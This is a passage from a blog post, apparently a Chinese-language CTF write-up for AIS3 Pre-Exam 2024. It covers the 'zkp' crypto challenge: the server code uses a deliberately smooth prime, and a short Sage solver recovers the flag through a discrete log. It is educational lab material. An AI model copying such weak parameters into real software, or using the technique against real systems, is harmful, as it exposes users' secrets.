bytes_to_long, getPrime, isPrime</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alarm</span>(<span class="params">second</span>):</span><br><span class="line">    <span class="comment"># This is just for timeout.</span></span><br><span class="line">    <span class="comment"># It should not do anything else with the challenge.</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">signum, frame</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Timeout!&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    signal.signal(signal.SIGALRM, handler)</span><br><span class="line">    signal.alarm(second)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> p &lt; (<span class="number">1</span> &lt;&lt; (n - <span class="number">1</span>)) :</span><br><span class="line">            p *= getPrime(<span class="number">5</span>)</span><br><span class="line">        p = p * <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p): <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zkp_protocol</span>(<span class="params">p, g, sk</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y = pow(g, sk, p) </span></span><br><span class="line">    r = random.randrange(p-<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    a = <span class="built_in">pow</span>(g, r, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Give me the challenge&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;c = &#x27;</span>))</span><br><span class="line">        w = (c * sk + r) % (p-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;w = <span class="subst">&#123;w&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="comment"># you can verify I know the flag with </span></span><br><span class="line">        <span class="comment"># g^w (mod p) = (g^flag)^c * g^r (mod p) = y^c * a (mod p)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Invalid input.&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    alarm(<span class="number">300</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">60</span></span><br><span class="line">    p = <span class="number">912963562570713895762123712634341582363191342435924527885311975797578046400116904692505817547350929619596093083745446525856149291591598712142696114753807416455553636357128701771057485027781550780145668058332461392878693207262984011086549089459904749465167095482671894984474035487400352761994560452501497000487</span></span><br><span class="line">    <span class="comment"># p is generated by gen_prime(1024)</span></span><br><span class="line">    g = <span class="number">5</span></span><br><span class="line">    y = <span class="built_in">pow</span>(g, bytes_to_long(flag), p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">******************************************************</span></span><br><span class="line"><span class="string">Have you heard of Zero Knowledge Proof? I cannot give </span></span><br><span class="line"><span class="string">you the flag, but I want to show you I know the flag.</span></span><br><span class="line"><span class="string">So, let me show you with ZKP.</span></span><br><span class="line"><span class="string">------------------------------------------------------</span></span><br><span class="line"><span class="string">1) Printe public key.</span></span><br><span class="line"><span class="string">2) Run ZKP protocol.</span></span><br><span class="line"><span class="string">3) Bye~</span></span><br><span class="line"><span class="string">******************************************************</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            option = <span class="built_in">input</span>(<span class="string">&quot;Option: &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(option) == <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;My public key:&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;g = <span class="subst">&#123;g&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;y = <span class="subst">&#123;y&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">int</span>(option) == <span class="number">2</span>:</span><br><span class="line">                zkp_protocol(p, g, bytes_to_long(flag))</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Bye~~~~~&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Something wrong?&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看出來 p 是 smooth prime，結合$y&#x3D;g^{ flag} (mod p)$，可以直接丟sage <code>discrete_log</code>解。<br><strong>solve.sage</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">912963562570713895762123712634341582363191342435924527885311975797578046400116904692505817547350929619596093083745446525856149291591598712142696114753807416455553636357128701771057485027781550780145668058332461392878693207262984011086549089459904749465167095482671894984474035487400352761994560452501497000487</span></span><br><span class="line">g = <span class="number">5</span></span><br><span class="line">y = <span class="number">826538666839613533825164219540577914201103248283631882579415248247469603672292332561005185045449294103457059566058782307774879654805356212117148864755019033392691510181464751398765490686084806155442759849410837406192708511190585484331707794669398717997173649869228717077858848442336016926370038781486833717341</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_discrete_log</span>(<span class="params">p, g, A</span>):</span><br><span class="line">    F = GF(p)</span><br><span class="line">    g, A = F(g), F(A)</span><br><span class="line">    a = discrete_log(A,g)</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(solve_discrete_log(p, g, y)))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Flag:AIS3{ToSolveADiscreteLogProblemWhithSmoothPIsSoEZZZZZZZZZZZ}</p>
</blockquote>
<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>賽後記分板：<br><img src="https://hackmd.io/_uploads/rkGfuesBC.png" alt="image">  </p>
<p><a target="_blank" rel="noopener" href="https://ctftime.org/team/276544">CakeisTheFake</a> 的三位高中生成功佔領2, 3, 4名owob<br>這場差一題就破台web，結果是zip經典梗qwq，我還有好多要學  </p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc"><span class="toc-number">2.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Welcome"><span class="toc-number">2.1.1.</span> <span class="toc-text">Welcome</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Three-Dimensional"><span class="toc-number">2.1.2.</span> <span class="toc-text">Three Dimensional</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Emoji-Console"><span class="toc-number">2.1.3.</span> <span class="toc-text">Emoji Console</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Quantum-Nim-Heist"><span class="toc-number">2.1.4.</span> <span class="toc-text">Quantum Nim Heist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hash-Guesser"><span class="toc-number">2.1.5.</span> <span class="toc-text">Hash Guesser</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">2.2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Evil-Calculator"><span class="toc-number">2.2.1.</span> <span class="toc-text">Evil Calculator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#It%E2%80%99s-MyGO"><span class="toc-number">2.2.2.</span> <span class="toc-text">It’s MyGO!!!!!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Login-Panel-Revenge-Revenge"><span class="toc-number">2.2.3.</span> <span class="toc-text">Login Panel Revenge Revenge</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Capoost"><span class="toc-number">2.2.4.</span> <span class="toc-text">Capoost</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ebook-Parser"><span class="toc-number">2.2.5.</span> <span class="toc-text">Ebook Parser</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn"><span class="toc-number">2.3.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Mathter"><span class="toc-number">2.3.1.</span> <span class="toc-text">Mathter</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rev"><span class="toc-number">2.4.</span> <span class="toc-text">Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#The-Long-Print"><span class="toc-number">2.4.1.</span> <span class="toc-text">The Long Print</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%81%AB%E6%8B%B3%E3%81%AE%E3%82%A8%E3%83%BC%E3%82%B9"><span class="toc-number">2.4.2.</span> <span class="toc-text">火拳のエース</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">2.5.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#babyRSA"><span class="toc-number">2.5.1.</span> <span class="toc-text">babyRSA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#easyRSA"><span class="toc-number">2.5.2.</span> <span class="toc-text">easyRSA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zkp"><span class="toc-number">2.5.3.</span> <span class="toc-text">zkp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">3.</span> <span class="toc-text">After all</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&text=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&title=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&is_video=false&description=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=AIS3 PRE EXAM 2024 Write Up&body=Check out this article: http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&title=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&title=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&title=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&title=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&name=AIS3 PRE EXAM 2024 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&t=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
